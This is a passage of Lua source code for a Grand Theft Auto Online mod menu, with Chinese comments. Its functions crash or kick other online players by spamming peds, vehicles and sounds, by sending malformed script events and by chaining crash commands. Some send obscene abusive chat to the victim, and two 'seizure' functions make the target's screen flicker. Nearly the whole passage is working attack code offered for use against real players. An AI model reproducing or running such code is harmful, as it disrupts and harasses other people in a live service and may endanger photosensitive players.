        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    for i = 0, 100 do 
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    wait(10)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    return
end
end

--大春痘崩溃
function big_chungus()
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
local mdl = util.joaat("A_C_Cat_01")
local mdl2 = util.joaat("U_M_Y_Zombie_01")
local mdl3 = util.joaat("A_F_M_ProlHost_01")
local mdl4 = util.joaat("A_M_M_SouCent_01")
local veh_mdl = util.joaat("insurgent2")
local veh_mdl2 = util.joaat("brawler")
util.request_model(veh_mdl)
util.request_model(veh_mdl2)
util.request_model(mdl)
util.request_model(mdl2)
util.request_model(mdl3)
util.request_model(mdl4)
for i = 1, 250 do
    local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
    local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
    local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
    local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
    local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
    local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
    PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

    PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

    PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

    PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

    PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
    PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

    PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
    PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

    TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)

    TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
    wait(100)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)

    PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
    
    PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

    TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)

    ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
    ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
    ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
    ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
    PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
    PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
    ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
    ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
end
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
entities.delete_by_handle(mdl)
entities.delete_by_handle(mdl2)
entities.delete_by_handle(mdl3)
entities.delete_by_handle(mdl4)
entities.delete_by_handle(veh_mdl)
entities.delete_by_handle(veh_mdl2)
wait(1000)
end

function adacrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 白白崩溃正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("planecrash " .. players.get_name(PlayerID))
        wait(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("wenyi " .. players.get_name(PlayerID))
        wait(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("nature " .. players.get_name(PlayerID))
    end
        wait(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        wait(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        wait(2500)
        util.toast("成功移除此玩家")
    end
else
    if players.exists(PlayerID) then
        menu.trigger_commands("planecrash " .. players.get_name(PlayerID))
        wait(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("wenyi " .. players.get_name(PlayerID))
        wait(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("nature " .. players.get_name(PlayerID))
    end
        wait(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        wait(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        wait(2500)
        util.toast("成功移除此玩家")
        end
    end
end

function gtcrash(PlayerID)
    if toxicchatincrash then
        chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 草泥马了",false,true,true)
        if players.exists(PlayerID) then
            menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
            wait(3000)
        end
        if players.exists(PlayerID) then
            menu.trigger_commands("lestercrestcrash " .. players.get_name(PlayerID))
            wait(3000)
        end
        if players.exists(PlayerID) then
            menu.trigger_commands("inshell " .. players.get_name(PlayerID))
        end
            wait(8000) 
        if players.exists(PlayerID) then
            util.toast("再等会")
            wait(2000)
            menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
            wait(2500)
            util.toast("成功移除此玩家")
    end
        else
            if players.exists(PlayerID) then
            menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
            wait(3000)
            end
            if players.exists(PlayerID) then
            menu.trigger_commands("lestercrestcrash " .. players.get_name(PlayerID))
            wait(3000)
            end
            if players.exists(PlayerID) then
            menu.trigger_commands("inshell " .. players.get_name(PlayerID))
            end
            wait(8000) 
            if players.exists(PlayerID) then
            util.toast("再等会")
            wait(2000)
            menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
            wait(2500)
            util.toast("成功移除此玩家")
        end
    end
end

function mixx_crash(PlayerID)
    if nicecrash_v1 then
        menu.trigger_commands("nicecrash " .. players.get_name(PlayerID) .. " 1")
    end
    if nicecrash_v2 then
        menu.trigger_commands("nicecrash " .. players.get_name(PlayerID) .. " 2")
    end
    if nicecrash_v3 then
        menu.trigger_commands("nicecrash " .. players.get_name(PlayerID) .. " 3")
    end
    if inshell_v1 then
        menu.trigger_commands("inshell " .. players.get_name(PlayerID))
    end
    if proluna_v1 then
        menu.trigger_commands("proluna " .. players.get_name(PlayerID))
    end
    if grief_v1 then
        menu.trigger_commands("grief " .. players.get_name(PlayerID))
    end
    if nature_v1 then
        menu.trigger_commands("nature " .. players.get_name(PlayerID))
    end
    if nature_v2 then
        menu.trigger_commands("hiroshima " .. players.get_name(PlayerID))
    end
    if sweetcrash_v1 then
        menu.trigger_commands("sweetcrash " .. players.get_name(PlayerID))
    end
    if cps_v1 then
        menu.trigger_commands("cps " .. players.get_name(PlayerID))
    end
    if lestercrestcrash_v1 then
        menu.trigger_commands("lestercrestcrash " .. players.get_name(PlayerID))
    end
    if dongge_v1 then
        menu.trigger_commands("dongge " .. players.get_name(PlayerID))
    end
    if planecrash_v1 then 
        menu.trigger_commands("planecrash " .. players.get_name(PlayerID))
    end
    if wenyi_v1 then
        menu.trigger_commands("wenyi " .. players.get_name(PlayerID))
    end
    if wade_v1 then
        menu.trigger_commands("wade " .. players.get_name(PlayerID))
    end
    if OXCrash_v1 then
        menu.trigger_commands("OXCrash " .. players.get_name(PlayerID))
    end
    if soundcrash_v1 then
        menu.trigger_commands("soundcrash " .. players.get_name(PlayerID) .. " 1")
    end
    if soundcrash_v2 then
        menu.trigger_commands("soundcrash " .. players.get_name(PlayerID) .. " 2")
    end
    if invalidmodelcrash_v1 then
        menu.trigger_commands("invalidmodelcrash " .. players.get_name(PlayerID))
    end
    if xxx5gcrash_v1 then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
    end
    if dick_v1 then
        menu.trigger_commands("dick " .. players.get_name(PlayerID))
    end
    if ChernobogCrash_v1 then
        menu.trigger_commands("ChernobogCrash " .. players.get_name(PlayerID) .. " 1")
    end
    if ChernobogCrash_v2 then
        menu.trigger_commands("ChernobogCrash " .. players.get_name(PlayerID) .. " 2")
    end
    if huntercrash_v1 then
        menu.trigger_commands("huntercrash " .. players.get_name(PlayerID) .. " 2")
    end
    if scriptevent_v1 then
        menu.trigger_commands("scriptevent " .. players.get_name(PlayerID) .. " 2")
    end
    if invalidclothes_v1 then
        menu.trigger_commands("invalidclothesv1 " .. players.get_name(PlayerID) .. " 2")
    end
    if invalidclothes_v2 then
        menu.trigger_commands("invalidclothesv2 " .. players.get_name(PlayerID) .. " 2")
    end
    if dh_v1 then
        menu.trigger_commands("dh " .. players.get_name(PlayerID) .. " 2")
    end
    if tuoche_v1 then
        menu.trigger_commands("tuoche " .. players.get_name(PlayerID) .. " 2")
    end
end
--aio崩溃
local getEntityCoords = ENTITY.GET_ENTITY_COORDS
local getPlayerPed = PLAYER.GET_PLAYER_PED
function aaio(PlayerID)
if players.exists(PlayerID) then
        local mdl = util.joaat("apa_mp_apa_yacht")
        local user = players.user_ped()
		local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
        BlockSyncs(PlayerID, function()
		wait(250)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
            PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
            PLAYER._SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
            wait(50)
            local pos = players.get_position(PlayerID)
            pos.z += 300
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            repeat
                wait()
            until PED.GET_PED_PARACHUTE_STATE(user) == 0
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            wait(50)
            TASK.CLEAR_PED_TASKS(user)
            wait(50)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            repeat
                wait()
            until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
            pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
            Jinx.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
            pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos.x,old_pos.y,old_pos.z, false, false)
        end)
    end
if players.exists(PlayerID) then
local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
        BlockSyncs(PlayerID, function() 
            wait(100)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
            wait()
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
            wait(250)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            wait(1000)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
        end)
    end
if players.exists(PlayerID) then
local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local pos=ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1,"10s",pos.x,pos.y,pos.z,"MP_MISSION_COUNTDOWN_SOUNDSET",true, 70, false)
            end
            wait(0)
        end
    end 
if players.exists(PlayerID) then
local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
            for i = 1, 20 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Event_Message_Purple', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
            end
            wait()
        end	
    end
if players.exists(PlayerID) then
              local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
              local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
              pos.z = pos.z + 10
              veh = entities.get_all_vehicles_as_handles()
              
            for i = 1, #veh do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
            end
        end
if players.exists(PlayerID) then
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(PlayerID))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(PlayerID))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                wait()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
	end
if players.exists(PlayerID) then	
		for pedp_crash = 2 , 6 do
	pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    dune = CreateVehicle(410882957,pos,ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune, true)
    dune1 = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune1, true)
    barracks = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks, true)
    barracks1 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks1, true)
    dunecar = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar, true)
    dunecar1 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar1, true)
    dunecar2 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar2, true)
    barracks3 = CreateVehicle(4244420235,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)
    barracks31 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks31, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks31, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar2, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar, pedp, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    wait(5000)
	for i = 0, 100  do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dunecar, pos.x, pos.y, pos.z, false, true, true)
			wait(10)
		end
        wait(2000)
        entities.delete_by_handle(dune)
        entities.delete_by_handle(dune1)
        entities.delete_by_handle(barracks)
        entities.delete_by_handle(barracks1)
        entities.delete_by_handle(dunecar)
        entities.delete_by_handle(dunecar1)
        entities.delete_by_handle(dunecar2)
        entities.delete_by_handle(barracks3)
        entities.delete_by_handle(barracks31)
    end
end
            if players.exists(PlayerID) then
            menu.trigger_commands("oxcrash " .. players.get_name(PlayerID))
            end
            wait(100)
            if players.exists(PlayerID) then
                notification("崩溃似乎已被目标拦截")
          else
            notification("成功移除此玩家")
            end
            notification("完成")
end
--脚本事件崩溃
function scriptcrash(PlayerID)
    util.trigger_script_event(1 << PlayerID, { -555356783, PlayerID ,85952,99999,52682274855,526822745 })
    util.trigger_script_event(1 << PlayerID, { 526822748, PlayerID ,78552,99999 ,7949161,789454312})
    util.trigger_script_event(1 << PlayerID, { -66669983, PlayerID ,526822748,555555, math.random(80521,2959749521) })
    util.trigger_script_event(1 << PlayerID, { -1733737974, PlayerID ,789522 ,59486,48512151,-9545440,5845131,848153,math.random(1,2959749),189958})
    util.trigger_script_event(1 << PlayerID, { -1529596656, PlayerID ,795221,59486,48512151,-9545440 , math.random(1,2959749) })
    util.trigger_script_event(1 << PlayerID, { -8965204809, PlayerID ,795221,59486,48512151,-9545440 })
end
 ---韦德崩
function wadecrash(PlayerID)
    menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SpawnPed_Wade = { }
        for i = 1, 60 do
            SpawnPed_Wade[i] = CreatePed(26, util.joaat("ig_wade"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            wait(1)
        end
        wait(5000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnPed_Wade[i])
        end
        menu.trigger_commands("anticrashcam off")
    end
---主机崩
function hostcrash(PlayerID)
    local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    menu.trigger_commands("tpmazehelipad")
    ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
    wait(1000)
    menu.trigger_commands("tpmazehelipad")
end
--闪屏 V1
function seizurev1(pid)
local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local playerpos = ENTITY.GET_ENTITY_COORDS(id)
playerpos.z = playerpos.z + 3

local khanjali = util.joaat("cargobob")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    wait()
end

local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
wait(0)
entities.delete_by_handle(vehicle1)

local khanjali = util.joaat("kosatka")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    wait()
end

local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
wait(0)
entities.delete_by_handle(vehicle1)
end
--闪屏 V2
function seizurev2(pid)
local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local playerpos = ENTITY.GET_ENTITY_COORDS(id)
playerpos.z = playerpos.z + 3

local khanjali = util.joaat("cargoplane")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    wait()
end

local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
